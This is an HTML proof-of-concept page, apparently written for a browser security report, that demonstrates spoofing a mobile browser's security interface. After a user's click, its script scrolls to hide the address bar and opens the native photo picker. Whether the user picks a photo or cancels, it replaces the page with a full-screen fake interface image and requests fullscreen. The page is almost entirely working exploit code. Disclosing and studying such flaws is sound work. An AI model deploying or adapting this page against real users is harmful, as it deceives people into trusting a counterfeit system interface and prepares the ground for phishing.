<!DOCTYPE html>
<html lang="en">
<head>
  <title>Security UI Spoof (Photo Picker)</title>
  <meta charset="utf-8">
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 200vh; /* penting utk scroll hide omnibox */
      background: #000;
      font-family: system-ui, sans-serif;
    }

    #spoof {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: none;
      z-index: 9999;
    }

    #content {
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      text-align: center;
    }

    input {
      display: none;
    }
  </style>
</head>

<body>

<!-- ðŸ”’ UI SPOOF -->
<img id="spoof" src="spof2.png" alt="spoof-ui">

<div id="content">
  <h1>Click anywhere</h1>
</div>

<!-- ðŸ“¸ Photo Picker -->
<input id="photoPicker" type="file" accept="image/*">

<script>
let triggered = false;

// preload spoof image
new Image().src = document.getElementById("spoof").src;

onclick = () => {
  if (triggered) return;
  triggered = true;

  // 1ï¸âƒ£ scroll dikit â†’ omnibox hide
  window.scrollTo(0, 1);

  // 2ï¸âƒ£ trusted system UI
  document.getElementById("photoPicker").click();
};

photoPicker.onchange = () => {
  // user pilih foto ATAU cancel â†’ PoC tetap lanjut

  // 3ï¸âƒ£ swap UI
  document.getElementById("content").style.display = "none";
  document.getElementById("spoof").style.display = "block";

  // 4ï¸âƒ£ fullscreen
  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen().catch(() => {});
  }
};
</script>

</body>
</html>
